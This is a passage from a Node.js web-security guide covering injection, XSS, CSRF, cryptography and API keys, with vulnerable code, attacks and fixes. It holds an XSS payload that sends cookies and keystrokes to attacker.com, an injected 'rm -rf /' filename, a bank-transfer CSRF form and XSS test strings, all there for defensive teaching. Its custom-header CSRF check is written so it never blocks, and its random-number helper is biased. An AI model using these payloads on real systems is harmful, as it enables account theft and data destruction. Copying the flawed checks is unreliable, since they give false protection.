id: 1' AND 1=2 --  (returns nothing)

// Time-based
id: 1' AND SLEEP(5) --  (delays response if vulnerable)

4. Second-Order SQL Injection
─────────────────────────────────────────────────────────────
// Malicious data stored in database, executed later

// Step 1: Register user
Username: admin'--

// Step 2: Later query uses stored username
UPDATE users SET email = 'new@email.com' WHERE username = 'admin'--'
// Comment makes it: WHERE username = 'admin'
// Updates admin's email instead!

Prevention (ALL ORMs & Libraries):
─────────────────────────────────────────────────────────────

✅ Node.js (PostgreSQL)
const { Pool } = require('pg');
const pool = new Pool();

// ✅ Parameterized query
const result = await pool.query(
  'SELECT * FROM users WHERE username = $1 AND email = $2',
  [username, email]
);

✅ Node.js (MySQL)
const mysql = require('mysql2/promise');

// ✅ Prepared statement
const [rows] = await connection.execute(
  'SELECT * FROM users WHERE id = ?',
  [userId]
);

✅ Sequelize (ORM)
const users = await User.findAll({
  where: {
    username: inputUsername,  // ✅ Automatically escaped
    age: { [Op.gt]: 18 }
  }
});

✅ Prisma (ORM)
const users = await prisma.user.findMany({
  where: {
    username: inputUsername,  // ✅ Safe
    age: { gt: 18 }
  }
});

✅ TypeORM
const users = await userRepository.find({
  where: {
    username: inputUsername  // ✅ Safe
  }
});

// ❌ NEVER use raw queries with user input
const query = `SELECT * FROM users WHERE id = ${userId}`;  // ❌ VULNERABLE!

// ✅ If you must use raw queries, parameterize!
const query = 'SELECT * FROM users WHERE id = ?';
const result = await db.raw(query, [userId]);

╔════════════════════════════════════════════════════════════╗
║                   NOSQL INJECTION                          ║
╚════════════════════════════════════════════════════════════╝

MongoDB Injection Examples:
─────────────────────────────────────────────────────────────

1. Authentication Bypass
─────────────────────────────────────────────────────────────
// Vulnerable code
app.post('/login', async (req, res) => {
  const { username, password } = req.body;
  const user = await db.collection('users').findOne({
    username: username,
    password: password
  });
});

// Attack payload (JSON)
{
  "username": {"$ne": null},
  "password": {"$ne": null}
}

// MongoDB query becomes:
{ username: { $ne: null }, password: { $ne: null } }
// Matches first user where username AND password exist!

2. JavaScript Injection
─────────────────────────────────────────────────────────────
// Vulnerable: $where operator
const users = await db.collection('users').find({
  $where: `this.username == '${username}'`
});

// Attack
username: "'; return true; //"

// Executed JavaScript
this.username == ''; return true; //'
// Always returns true!

3. Operator Injection
─────────────────────────────────────────────────────────────
// Attack payloads
{
  "username": {"$gt": ""},  // Greater than empty string (matches all)
  "age": {"$gt": 0}         // Age greater than 0 (matches most)
}

Prevention:
─────────────────────────────────────────────────────────────

✅ Type Validation
app.post('/login', async (req, res) => {
  const { username, password } = req.body;

  // ✅ Ensure strings
  if (typeof username !== 'string' || typeof password !== 'string') {
    return res.status(400).json({ error: 'Invalid input' });
  }

  // ✅ Trim and validate length
  const cleanUsername = username.trim();
  const cleanPassword = password.trim();

  if (!cleanUsername || !cleanPassword) {
    return res.status(400).json({ error: 'Invalid input' });
  }

  const user = await User.findOne({ username: cleanUsername });

  // ✅ Use bcrypt for password (not direct comparison)
  if (!user || !await bcrypt.compare(cleanPassword, user.passwordHash)) {
    return res.status(401).json({ error: 'Invalid credentials' });
  }

  res.json({ success: true });
});

✅ Mongoose Strict Mode
const userSchema = new mongoose.Schema({
  username: { type: String, required: true },
  email: { type: String, required: true },
  passwordHash: { type: String, required: true }
}, {
  strict: true  // ✅ Reject unknown fields
});

✅ Sanitization Library
const mongoSanitize = require('express-mongo-sanitize');

// Remove $ and . from user input
app.use(mongoSanitize());

// Now attacks like {"$ne": null} become {"ne": null} (harmless)

✅ Avoid $where operator
// ❌ Don't use $where with user input
const users = await User.find({
  $where: `this.age > ${minAge}`  // ❌ Vulnerable!
});

// ✅ Use proper operators instead
const users = await User.find({
  age: { $gt: minAge }  // ✅ Safe
});

╔════════════════════════════════════════════════════════════╗
║                   COMMAND INJECTION                        ║
╚════════════════════════════════════════════════════════════╝

Examples:
─────────────────────────────────────────────────────────────

❌ Vulnerable Code:
const { exec } = require('child_process');

// Image processing endpoint
app.post('/process', (req, res) => {
  const filename = req.body.filename;

  // ❌ NEVER DO THIS
  exec(`convert ${filename} -resize 800x600 output.jpg`, (error, stdout) => {
    if (error) {
      return res.status(500).json({ error: error.message });
    }
    res.json({ success: true });
  });
});

// Attack
filename: "input.jpg; rm -rf /; #"

// Executed command
convert input.jpg; rm -rf /; # -resize 800x600 output.jpg
                   ↑
            Deletes everything!

✅ Safe Approach:
const { spawn } = require('child_process');
const path = require('path');

app.post('/process', async (req, res) => {
  const filename = req.body.filename;

  // ✅ Validate filename
  if (!/^[a-zA-Z0-9_-]+\.(jpg|png|gif)$/.test(filename)) {
    return res.status(400).json({ error: 'Invalid filename' });
  }

  // ✅ Construct safe path
  const inputPath = path.join(__dirname, 'uploads', filename);
  const outputPath = path.join(__dirname, 'processed', `${Date.now()}.jpg`);

  // ✅ Use spawn with array (no shell interpretation)
  const convert = spawn('convert', [
    inputPath,
    '-resize', '800x600',
    outputPath
  ]);

  convert.on('close', (code) => {
    if (code === 0) {
      res.json({ success: true, output: outputPath });
    } else {
      res.status(500).json({ error: 'Processing failed' });
    }
  });
});

// ✅ Or use libraries
const sharp = require('sharp');

await sharp(inputPath)
  .resize(800, 600)
  .toFile(outputPath);

╔════════════════════════════════════════════════════════════╗
║                   LDAP INJECTION                           ║
╚════════════════════════════════════════════════════════════╝

❌ Vulnerable LDAP Query:
const ldap = require('ldapjs');

// Search for user
const filter = `(uid=${username})`;  // ❌ Vulnerable!

// Attack
username: "*)(uid=*"

// Becomes: (uid=*)(uid=*) - matches all users!

✅ Prevention:
// Escape special characters
function escapeLDAP(str) {
  return str.replace(/[*()\\]/g, '\\$&');
}

const filter = `(uid=${escapeLDAP(username)})`;  // ✅ Safe

// Or use library
const { escape } = require('ldap-escape');
const filter = `(uid=${escape(username)})`;

═══════════════════════════════════════════════════════════
```

---

<div align="center">

## 🎭 Cross-Site Scripting (XSS)

</div>

### XSS Attack Types & Prevention 🎭

```bash
# ═══════════════════════════════════════════
# XSS ATTACK TYPES
# ═══════════════════════════════════════════

╔════════════════════════════════════════════════════════════╗
║                   TYPES OF XSS                             ║
╚════════════════════════════════════════════════════════════╝
```

<div align="center">

| Type              | Storage     | Execution       | Severity    | Detection |
| ----------------- | ----------- | --------------- | ----------- | --------- |
| **Stored XSS**    | Database    | Every page load | 🔴 Critical | Hard      |
| **Reflected XSS** | URL/Request | Immediate       | 🟡 High     | Medium    |
| **DOM-based XSS** | Client-side | Client-side     | 🟡 High     | Hard      |

</div>

```javascript
# ═══════════════════════════════════════════
# STORED XSS (Most Dangerous)
# ═══════════════════════════════════════════

╔════════════════════════════════════════════════════════════╗
║                   STORED XSS ATTACK                        ║
╚════════════════════════════════════════════════════════════╝

Scenario: Comment System
─────────────────────────────────────────────────────────────

❌ VULNERABLE CODE:
// Backend - save comment
app.post('/api/comments', async (req, res) => {
  const { content } = req.body;

  // ❌ No sanitization!
  await Comment.create({
    content: content,  // Stores malicious script
    userId: req.user.id
  });

  res.json({ success: true });
});

// Frontend - display comments
function displayComments(comments) {
  comments.forEach(comment => {
    // ❌ DANGEROUS: Renders HTML
    document.getElementById('comments').innerHTML += `
      <div class="comment">
        <p>${comment.content}</p>
      </div>
    `;
  });
}

// Attack Payload:
<script>
  // Steal cookies
  fetch('https://attacker.com/steal?cookie=' + document.cookie);
</script>

<img src=x onerror="
  // Keylogger
  document.addEventListener('keypress', (e) => {
    fetch('https://attacker.com/log?key=' + e.key);
  });
">

// Every user who views the page is compromised!

✅ PREVENTION:

// Backend - Sanitize input
const createDOMPurify = require('dompurify');
const { JSDOM } = require('jsdom');

const window = new JSDOM('').window;
const DOMPurify = createDOMPurify(window);

app.post('/api/comments', async (req, res) => {
  const { content } = req.body;

  // ✅ Sanitize HTML
  const clean = DOMPurify.sanitize(content, {
    ALLOWED_TAGS: ['b', 'i', 'em', 'strong', 'a', 'p'],
    ALLOWED_ATTR: ['href']
  });

  await Comment.create({
    content: clean,
    userId: req.user.id
  });

  res.json({ success: true });
});

// Frontend - Escape output
function escapeHtml(text) {
  const div = document.createElement('div');
  div.textContent = text;
  return div.innerHTML;
}

function displayComments(comments) {
  const container = document.getElementById('comments');

  comments.forEach(comment => {
    const div = document.createElement('div');
    div.className = 'comment';

    const p = document.createElement('p');
    p.textContent = comment.content;  // ✅ Text only, no HTML

    div.appendChild(p);
    container.appendChild(div);
  });
}

// React (automatically escapes)
function Comment({ content }) {
  return (
    <div className="comment">
      <p>{content}</p>  {/* ✅ Escaped by default */}
    </div>
  );
}

// If you MUST render HTML (use with caution!)
<div dangerouslySetInnerHTML={{
  __html: DOMPurify.sanitize(content)  // ✅ Sanitized first
}} />

# ═══════════════════════════════════════════
# REFLECTED XSS
# ═══════════════════════════════════════════

╔════════════════════════════════════════════════════════════╗
║                   REFLECTED XSS ATTACK                     ║
╚════════════════════════════════════════════════════════════╝

Scenario: Search functionality
─────────────────────────────────────────────────────────────

❌ VULNERABLE:
// Backend
app.get('/search', (req, res) => {
  const query = req.query.q;

  // ❌ Reflects user input directly
  res.send(`
    <h1>Search Results for: ${query}</h1>
    <p>No results found</p>
  `);
});

// Attack URL:
https://myapp.com/search?q=<script>alert(document.cookie)</script>

// Victim clicks malicious link → Script executes!

✅ PREVENTION:
const escape = require('escape-html');

app.get('/search', (req, res) => {
  const query = req.query.q || '';

  // ✅ Escape HTML entities
  const safeQuery = escape(query);

  res.send(`
    <h1>Search Results for: ${safeQuery}</h1>
    <p>No results found</p>
  `);
});

// Result: <script> becomes &lt;script&gt; (displayed as text)

// Better: Use template engine with auto-escaping
app.set('view engine', 'ejs');

app.get('/search', (req, res) => {
  res.render('search', {
    query: req.query.q  // ✅ EJS escapes by default
  });
});

// search.ejs
<h1>Search Results for: <%= query %></h1>
<!-- ✅ Automatically escaped -->

# ═══════════════════════════════════════════
# DOM-BASED XSS
# ═══════════════════════════════════════════

╔════════════════════════════════════════════════════════════╗
║                   DOM-BASED XSS ATTACK                     ║
╚════════════════════════════════════════════════════════════╝

Client-side JavaScript manipulates DOM with user input
─────────────────────────────────────────────────────────────

❌ VULNERABLE:
// URL: https://myapp.com/#name=<img src=x onerror=alert(1)>

// JavaScript
const params = new URLSearchParams(window.location.hash.substring(1));
const name = params.get('name');

// ❌ Dangerous
document.getElementById('welcome').innerHTML = `Welcome ${name}!`;

✅ PREVENTION:
const params = new URLSearchParams(window.location.hash.substring(1));
const name = params.get('name');

// ✅ Use textContent (safe)
document.getElementById('welcome').textContent = `Welcome ${name}!`;

// Or sanitize if HTML needed
import DOMPurify from 'dompurify';
document.getElementById('welcome').innerHTML =
  DOMPurify.sanitize(`Welcome ${name}!`);

// Dangerous DOM APIs to avoid with user input:
─────────────────────────────────────────────────────────────
❌ element.innerHTML = userInput
❌ element.outerHTML = userInput
❌ document.write(userInput)
❌ eval(userInput)
❌ setTimeout(userInput, 1000)
❌ setInterval(userInput, 1000)
❌ Function(userInput)()
❌ element.setAttribute('onclick', userInput)

✅ Safe alternatives:
element.textContent = userInput
element.setAttribute('data-value', userInput)
element.addEventListener('click', handler)

╔════════════════════════════════════════════════════════════╗
║                   CONTENT SECURITY POLICY (CSP)            ║
╚════════════════════════════════════════════════════════════╝

Best XSS Defense: CSP Header
─────────────────────────────────────────────────────────────

// Express middleware
const helmet = require('helmet');

app.use(
  helmet.contentSecurityPolicy({
    directives: {
      defaultSrc: ["'self'"],  // Only same origin
      scriptSrc: [
        "'self'",              // Same origin scripts
        "'nonce-{random}'",    // Nonce-based (best)
        // ❌ Avoid: "'unsafe-inline'" (allows inline scripts)
      ],
      styleSrc: ["'self'", "'unsafe-inline'"],  // Styles need inline often
      imgSrc: ["'self'", "data:", "https:"],
      connectSrc: ["'self'", "https://api.myapp.com"],
      fontSrc: ["'self'", "https://fonts.gstatic.com"],
      objectSrc: ["'none'"],  // Block plugins
      mediaSrc: ["'self'"],
      frameSrc: ["'none'"],   // Block iframes
      upgradeInsecureRequests: [],  // Force HTTPS
    },
  })
);

// Nonce-based CSP (most secure)
app.use((req, res, next) => {
  res.locals.cspNonce = crypto.randomBytes(16).toString('base64');
  next();
});

app.use(
  helmet.contentSecurityPolicy({
    directives: {
      scriptSrc: ["'self'", (req, res) => `'nonce-${res.locals.cspNonce}'`],
    },
  })
);

// In HTML
<script nonce="<%= cspNonce %>">
  // This script is allowed
  console.log('Safe inline script');
</script>

<script>
  // This script is BLOCKED (no nonce)
  console.log('Blocked!');
</script>

CSP Violation Reporting:
─────────────────────────────────────────────────────────────
app.use(
  helmet.contentSecurityPolicy({
    directives: {
      // ... directives ...
      reportUri: '/csp-violation-report'
    },
  })
);

app.post('/csp-violation-report', express.json({ type: 'application/csp-report' }), (req, res) => {
  console.log('CSP Violation:', req.body);
  res.status(204).end();
});

// Monitor violations to detect attacks!

╔════════════════════════════════════════════════════════════╗
║                   XSS PREVENTION CHECKLIST                 ║
╚════════════════════════════════════════════════════════════╝

Defense Layers:
─────────────────────────────────────────────────────────────
✅ Input Sanitization (backend)
   • Use DOMPurify
   • Whitelist allowed tags
   • Strip dangerous attributes

✅ Output Encoding (frontend)
   • Use textContent over innerHTML
   • Framework auto-escaping (React, Vue)
   • Escape HTML entities

✅ Content Security Policy
   • Restrict script sources
   • Use nonces
   • Report violations

✅ HTTPOnly Cookies
   • Prevent JavaScript cookie access
   • Set httpOnly: true on session cookies

✅ Regular Security Audits
   • Automated scanning
   • Manual code review
   • Penetration testing

Testing for XSS:
─────────────────────────────────────────────────────────────
Test payloads:
<script>alert(1)</script>
<img src=x onerror=alert(1)>
<svg onload=alert(1)>
javascript:alert(1)
<iframe src="javascript:alert(1)">
<body onload=alert(1)>
" onclick=alert(1) "
'-alert(1)-'
`;alert(1);//

═══════════════════════════════════════════════════════════
```

---

<div align="center">

## 🎪 Cross-Site Request Forgery (CSRF)

</div>

### CSRF Attack & Prevention 🎪

```bash
# ═══════════════════════════════════════════
# CSRF ATTACKS
# ═══════════════════════════════════════════

╔════════════════════════════════════════════════════════════╗
║                   HOW CSRF WORKS                           ║
╚════════════════════════════════════════════════════════════╝

Attack Scenario:
─────────────────────────────────────────────────────────────
1. Victim logs into bank.com
2. Bank.com sets session cookie
3. Victim visits evil.com (without logging out)
4. Evil.com contains malicious code:

<form action="https://bank.com/transfer" method="POST">
  <input type="hidden" name="to" value="attacker" />
  <input type="hidden" name="amount" value="10000" />
</form>
<script>
  document.forms[0].submit();  // Auto-submit
</script>

5. Browser automatically sends bank.com cookies!
6. Money transferred without victim's knowledge!

Why it works:
• Browser automatically sends cookies to bank.com
• Bank.com can't tell if request came from their site or evil.com
• Session cookie authenticates the request

❌ VULNERABLE API:
app.post('/api/transfer', auth, async (req, res) => {
  const { to, amount } = req.body;

  // ❌ No CSRF protection
  await transferMoney(req.user.id, to, amount);

  res.json({ success: true });
});

╔════════════════════════════════════════════════════════════╗
║                   CSRF TOKEN PROTECTION                    ║
╚════════════════════════════════════════════════════════════╝

✅ METHOD 1: CSRF Tokens
const csrf = require('csurf');

// Setup CSRF protection
const csrfProtection = csrf({ cookie: true });

app.use(cookieParser());
app.use(csrfProtection);

// Generate token
app.get('/form', csrfProtection, (req, res) => {
  res.render('form', { csrfToken: req.csrfToken() });
});

// Verify token
app.post('/api/transfer', csrfProtection, async (req, res) => {
  // ✅ CSRF token verified automatically
  const { to, amount } = req.body;
  await transferMoney(req.user.id, to, amount);
  res.json({ success: true });
});

// HTML form
<form action="/api/transfer" method="POST">
  <input type="hidden" name="_csrf" value="<%= csrfToken %>" />
  <input name="to" />
  <input name="amount" />
  <button type="submit">Transfer</button>
</form>

// AJAX requests
fetch('/api/transfer', {
  method: 'POST',
  headers: {
    'Content-Type': 'application/json',
    'CSRF-Token': csrfToken  // Include token in header
  },
  body: JSON.stringify({ to, amount })
});

✅ METHOD 2: SameSite Cookies (Modern)
app.use(session({
  secret: process.env.SESSION_SECRET,
  cookie: {
    httpOnly: true,
    secure: true,
    sameSite: 'strict'  // ✅ Blocks cross-site requests
  }
}));

SameSite Values:
─────────────────────────────────────────────────────────────
• strict: Never sent on cross-site requests (most secure)
• lax: Sent on top-level navigation (links) but not AJAX
• none: Sent on all requests (requires secure: true)

// Recommended
sameSite: 'strict'  // For high-security apps
sameSite: 'lax'     // For most apps (balances security & UX)

✅ METHOD 3: Double Submit Cookie
// Set CSRF token in cookie and require it in header
app.use((req, res, next) => {
  if (!req.cookies.csrfToken) {
    const token = crypto.randomBytes(32).toString('hex');
    res.cookie('csrfToken', token, {
      httpOnly: false,  // JavaScript needs to read it
      secure: true,
      sameSite: 'strict'
    });
  }
  next();
});

// Verify token
app.use((req, res, next) => {
  if (['POST', 'PUT', 'DELETE', 'PATCH'].includes(req.method)) {
    const cookieToken = req.cookies.csrfToken;
    const headerToken = req.headers['x-csrf-token'];

    if (!cookieToken || cookieToken !== headerToken) {
      return res.status(403).json({ error: 'CSRF token mismatch' });
    }
  }
  next();
});

// Client-side
const csrfToken = document.cookie
  .split('; ')
  .find(row => row.startsWith('csrfToken='))
  ?.split('=')[1];

fetch('/api/transfer', {
  method: 'POST',
  headers: {
    'Content-Type': 'application/json',
    'X-CSRF-Token': csrfToken  // Must match cookie
  },
  body: JSON.stringify({ to, amount })
});

✅ METHOD 4: Custom Header (AJAX only)
// For API-only applications
app.use((req, res, next) => {
  if (['POST', 'PUT', 'DELETE', 'PATCH'].includes(req.method)) {
    // Require custom header
    if (!req.headers['x-requested-with'] === 'XMLHttpRequest') {
      return res.status(403).json({ error: 'Invalid request' });
    }
  }
  next();
});

// Works because:
// • Simple forms can't set custom headers
// • AJAX requests from other origins blocked by CORS
// • Only requests from your app can include custom header

fetch('/api/transfer', {
  method: 'POST',
  headers: {
    'Content-Type': 'application/json',
    'X-Requested-With': 'XMLHttpRequest'  // Custom header
  },
  body: JSON.stringify({ to, amount })
});

╔════════════════════════════════════════════════════════════╗
║                   CSRF PREVENTION CHECKLIST                ║
╚════════════════════════════════════════════════════════════╝

✅ Use SameSite cookies (easiest, modern browsers)
✅ CSRF tokens for state-changing operations
✅ Verify Origin/Referer headers
✅ Re-authenticate for sensitive actions
✅ Use POST for state-changing operations (not GET)
✅ Short session timeouts
✅ Log suspicious activity

// Complete CSRF protection
app.use(cookieParser());

// Session with SameSite
app.use(session({
  secret: process.env.SESSION_SECRET,
  cookie: {
    httpOnly: true,
    secure: process.env.NODE_ENV === 'production',
    sameSite: 'strict'  // ✅ Primary defense
  }
}));

// CSRF tokens
app.use(csrf({ cookie: true }));

// Origin verification
app.use((req, res, next) => {
  if (['POST', 'PUT', 'DELETE', 'PATCH'].includes(req.method)) {
    const origin = req.headers.origin || req.headers.referer;
    const allowedOrigins = [
      'https://myapp.com',
      'https://www.myapp.com'
    ];

    if (!origin || !allowedOrigins.some(allowed => origin.startsWith(allowed))) {
      return res.status(403).json({ error: 'Invalid origin' });
    }
  }
  next();
});

═══════════════════════════════════════════════════════════
```

---

<div align="center">

## 🔐 Cryptography & Encryption

</div>

### Secure Cryptographic Practices 🔐

```bash
# ═══════════════════════════════════════════
# CRYPTOGRAPHY FUNDAMENTALS
# ═══════════════════════════════════════════

╔════════════════════════════════════════════════════════════╗
║                   HASHING vs ENCRYPTION                    ║
╚════════════════════════════════════════════════════════════╝

Hashing (One-Way):
─────────────────────────────────────────────────────────────
Input → Hash Function → Fixed-length output (irreversible)

Use Cases:
• Password storage
• Data integrity verification
• Digital signatures
• Checksum generation

Properties:
✓ Deterministic (same input = same output)
✓ Fast to compute
✓ Irreversible (can't get original)
✓ Avalanche effect (small change = completely different hash)
✓ Collision resistant

Encryption (Two-Way):
─────────────────────────────────────────────────────────────
Plaintext → Encryption → Ciphertext → Decryption → Plaintext

Use Cases:
• Storing sensitive data
• Secure communication
• File encryption
• Database field encryption

Types:
• Symmetric: Same key encrypts & decrypts (AES)
• Asymmetric: Public key encrypts, private key decrypts (RSA)

╔════════════════════════════════════════════════════════════╗
║                   PASSWORD HASHING                         ║
╚════════════════════════════════════════════════════════════╝

❌ NEVER DO THIS:
const crypto = require('crypto');

// ❌ Plain MD5 (broken, too fast)
const hash = crypto.createHash('md5').update(password).digest('hex');

// ❌ SHA-256 (too fast, no salt)
const hash = crypto.createHash('sha256').update(password).digest('hex');

// Why bad:
// • Too fast → easy to brute force
// • No salt → rainbow table attacks
// • Same password → same hash (pattern leaks)

✅ CORRECT: bcrypt
const bcrypt = require('bcrypt');

// Hash password
async function hashPassword(password) {
  const saltRounds = 12;  // Higher = slower = more secure
  const hash = await bcrypt.hash(password, saltRounds);
  return hash;
}

// Verify password
async function verifyPassword(password, hash) {
  const isValid = await bcrypt.compare(password, hash);
  return isValid;
}

// Example
const hash = await hashPassword('mypassword');
// $2b$12$LQv3c1yqBWVHxkd0LHAkCOYz6TtxMQJqhN8/LewY5GyYL5e3Q6lBu
//  ↑   ↑         ↑                                ↑
//  |   |         |                                |
// alg cost     salt (22 chars)              hash (31 chars)

const isValid = await verifyPassword('mypassword', hash);
// true

const isValid = await verifyPassword('wrongpassword', hash);
// false

// Why bcrypt is good:
// ✓ Slow by design (adjustable)
// ✓ Automatic salt generation
// ✓ Resistant to rainbow tables
// ✓ Industry standard

✅ ALTERNATIVE: Argon2 (Newer, recommended)
const argon2 = require('argon2');

// Hash password
const hash = await argon2.hash('mypassword', {
  type: argon2.argon2id,  // Hybrid (best)
  memoryCost: 2 ** 16,    // 64 MB
  timeCost: 3,            // Iterations
  parallelism: 1          // Threads
});

// Verify password
const isValid = await argon2.verify(hash, 'mypassword');

// Argon2 is:
// ✓ Winner of Password Hashing Competition (2015)
// ✓ Memory-hard (resists GPU/ASIC attacks)
// ✓ Configurable (time, memory, parallelism)
// ✓ Recommended for new projects

╔════════════════════════════════════════════════════════════╗
║                   DATA ENCRYPTION                          ║
╚════════════════════════════════════════════════════════════╝

✅ Symmetric Encryption (AES-256-GCM)
const crypto = require('crypto');

// Generate key (do once, store securely)
function generateKey() {
  return crypto.randomBytes(32); // 256 bits
}

// Encrypt
function encrypt(text, key) {
  const iv = crypto.randomBytes(16);  // Initialization vector
  const cipher = crypto.createCipheriv('aes-256-gcm', key, iv);

  let encrypted = cipher.update(text, 'utf8', 'hex');
  encrypted += cipher.final('hex');

  const authTag = cipher.getAuthTag();

  return {
    encrypted,
    iv: iv.toString('hex'),
    authTag: authTag.toString('hex')
  };
}

// Decrypt
function decrypt(encryptedData, key) {
  const decipher = crypto.createDecipheriv(
    'aes-256-gcm',
    key,
    Buffer.from(encryptedData.iv, 'hex')
  );

  decipher.setAuthTag(Buffer.from(encryptedData.authTag, 'hex'));

  let decrypted = decipher.update(encryptedData.encrypted, 'hex', 'utf8');
  decrypted += decipher.final('utf8');

  return decrypted;
}

// Usage
const key = generateKey();
const encrypted = encrypt('Sensitive data', key);
console.log(encrypted);
// {
//   encrypted: '8f7a...',
//   iv: '9b2c...',
//   authTag: 'a1f3...'
// }

const decrypted = decrypt(encrypted, key);
console.log(decrypted);  // 'Sensitive data'

// Store key securely:
// ✓ Environment variable
// ✓ Key management service (AWS KMS, Azure Key Vault)
// ✓ Hardware security module (HSM)
// ❌ Never in code/git

✅ Asymmetric Encryption (RSA)
const crypto = require('crypto');

// Generate key pair
const { publicKey, privateKey } = crypto.generateKeyPairSync('rsa', {
  modulusLength: 4096,  // Key size
  publicKeyEncoding: {
    type: 'spki',
    format: 'pem'
  },
  privateKeyEncoding: {
    type: 'pkcs8',
    format: 'pem',
    cipher: 'aes-256-cbc',
    passphrase: 'top secret'  // Encrypt private key
  }
});

// Encrypt with public key (anyone can do this)
function encryptRSA(text, publicKey) {
  const encrypted = crypto.publicEncrypt(
    {
      key: publicKey,
      padding: crypto.constants.RSA_PKCS1_OAEP_PADDING,
      oaepHash: 'sha256'
    },
    Buffer.from(text)
  );
  return encrypted.toString('base64');
}

// Decrypt with private key (only owner can do this)
function decryptRSA(encrypted, privateKey, passphrase) {
  const decrypted = crypto.privateDecrypt(
    {
      key: privateKey,
      passphrase: passphrase,
      padding: crypto.constants.RSA_PKCS1_OAEP_PADDING,
      oaepHash: 'sha256'
    },
    Buffer.from(encrypted, 'base64')
  );
  return decrypted.toString();
}

// Usage
const encrypted = encryptRSA('Secret message', publicKey);
const decrypted = decryptRSA(encrypted, privateKey, 'top secret');

// Use cases for RSA:
// • Digital signatures
// • Key exchange
// • Small data encryption
// Note: RSA is slow, use AES for large data

╔════════════════════════════════════════════════════════════╗
║                   SECURE RANDOM GENERATION                 ║
╚════════════════════════════════════════════════════════════╝

❌ INSECURE:
// ❌ Math.random() is NOT cryptographically secure
const token = Math.random().toString(36).substring(2);

// ❌ Predictable
const token = Date.now().toString(36);

✅ SECURE:
const crypto = require('crypto');

// Random bytes
const token = crypto.randomBytes(32).toString('hex');
// 64 character hex string

// Random UUID
const { v4: uuidv4 } = require('uuid');
const id = uuidv4();
// a1b2c3d4-e5f6-7890-1234-567890abcdef

// Cryptographically secure random number
function randomInt(min, max) {
  const range = max - min;
  const bytesNeeded = Math.ceil(Math.log2(range) / 8);
  const maxVal = Math.pow(256, bytesNeeded);
  const randomBytes = crypto.randomBytes(bytesNeeded);
  const randomValue = randomBytes.readUIntBE(0, bytesNeeded);
  return min + (randomValue % range);
}

const dice = randomInt(1, 7);  // 1-6 inclusive

╔════════════════════════════════════════════════════════════╗
║                   KEY MANAGEMENT                           ║
╚════════════════════════════════════════════════════════════╝

Best Practices:
─────────────────────────────────────────────────────────────
✅ Use environment variables
   process.env.ENCRYPTION_KEY

✅ Use key management services
   • AWS KMS
   • Azure Key Vault
   • HashiCorp Vault
   • Google Cloud KMS

✅ Rotate keys regularly
   • Generate new key
   • Re-encrypt data with new key
   • Retire old key

✅ Separate keys by environment
   • dev-encryption-key
   • staging-encryption-key
   • prod-encryption-key

❌ Never:
   • Hardcode keys in source code
   • Commit keys to version control
   • Use same key for all environments
   • Share keys via email/Slack
   • Use weak keys (use 256-bit minimum)

Example: Using AWS KMS
─────────────────────────────────────────────────────────────
const AWS = require('aws-sdk');
const kms = new AWS.KMS({ region: 'us-east-1' });

// Encrypt
async function encryptWithKMS(plaintext) {
  const params = {
    KeyId: process.env.KMS_KEY_ID,
    Plaintext: plaintext
  };

  const result = await kms.encrypt(params).promise();
  return result.CiphertextBlob.toString('base64');
}

// Decrypt
async function decryptWithKMS(ciphertext) {
  const params = {
    CiphertextBlob: Buffer.from(ciphertext, 'base64')
  };

  const result = await kms.decrypt(params).promise();
  return result.Plaintext.toString();
}

// Benefits:
// ✓ Keys never leave KMS
// ✓ Audit trail of all operations
// ✓ Automatic key rotation
// ✓ Fine-grained access control

═══════════════════════════════════════════════════════════
```

---

<div align="center">

## 📡 API Security

</div>

### Complete API Protection 🛡️

```bash
# ═══════════════════════════════════════════
# API SECURITY FUNDAMENTALS
# ═══════════════════════════════════════════

╔════════════════════════════════════════════════════════════╗
║                   API SECURITY LAYERS                      ║
╚════════════════════════════════════════════════════════════╝

Defense in Depth for APIs:
─────────────────────────────────────────────────────────────
1. Authentication    → Who are you?
2. Authorization     → What can you do?
3. Rate Limiting     → How much can you do?
4. Input Validation  → Is your data safe?
5. Output Filtering  → What data do you see?
6. Encryption        → Is communication secure?
7. Logging          → What happened?

# ═══════════════════════════════════════════
# AUTHENTICATION STRATEGIES
# ═══════════════════════════════════════════

╔════════════════════════════════════════════════════════════╗
║                   API KEY AUTHENTICATION                   ║
╚════════════════════════════════════════════════════════════╝

Simple API Key Implementation:
─────────────────────────────────────────────────────────────
const crypto = require('crypto');
const bcrypt = require('bcrypt');

// Generate API key
function generateApiKey() {
  // Format: prefix_randomdata
  const prefix = 'sk';  // Secret key
  const random = crypto.randomBytes(32).toString('hex');
  return `${prefix}_${random}`;
}

// Create API key for user
app.post('/api/keys', auth, async (req, res) => {
  const { name, permissions, expiresIn } = req.body;

  // Generate key
  const apiKey = generateApiKey();

  // Hash for storage (never store plain text!)
  const keyHash = await bcrypt.hash(apiKey, 10);

  // Calculate expiration
  const expiresAt = expiresIn
    ? new Date(Date.now() + expiresIn * 24 * 60 * 60 * 1000)
    : null;

  // Save to database
  const key = await ApiKey.create({
    userId: req.user.id,
    name,
    keyHash,
    permissions: permissions || ['read'],
    expiresAt,
    createdAt: new Date(),
    lastUsed: null
  });

  // Return key ONCE (user must save it)
  res.json({
    apiKey,  // ⚠️ Show only on creation!
    id: key.id,
    name,
    permissions,
    expiresAt
  });
});

// Authenticate with API key
const apiKeyAuth = async (req, res, next) => {
  const apiKey = req.headers['x-api-key'] || req.query.api_key;

  if (!apiKey) {
    return res.status(401).json({
      error: 'API key required',
      message: 'Include X-API-Key header or api_key query parameter'
    });
  }

  // Validate format
  if (!apiKey.startsWith('sk_')) {
    return res.status(401).json({ error: 'Invalid API key format' });
  }

  try {
    // Find all active keys (need to hash and compare)
    const activeKeys = await ApiKey.find({
      revoked: false,
      $or: [
        { expiresAt: null },
        { expiresAt: { $gt: new Date() } }
      ]
    });

    // Find matching key
    let matchedKey = null;
    for (const key of activeKeys) {
      if (await bcrypt.compare(apiKey, key.keyHash)) {
        matchedKey = key;
        break;
      }
    }

    if (!matchedKey) {
      await logFailedApiKeyAttempt(apiKey, req.ip);
      return res.status(401).json({ error: 'Invalid API key' });
    }

    // Update last used
    await matchedKey.update({ lastUsed: new Date() });

    // Attach to request
    req.user = await User.findById(matchedKey.userId);
    req.apiKey = matchedKey;
    req.authMethod = 'api_key';

    next();
  } catch (error) {
    console.error('API key auth error:', error);
    res.status(500).json({ error: 'Authentication failed' });
  }
};

// Check permissions
const requirePermission = (permission) => {
  return (req, res, next) => {
    if (!req.apiKey) {
      return res.status(403).json({ error: 'API key required' });
    }

    if (!req.apiKey.permissions.includes(permission)) {
      return res.status(403).json({
        error: 'Insufficient permissions',
        required: permission,
        available: req.apiKey.permissions
      });
    }

    next();
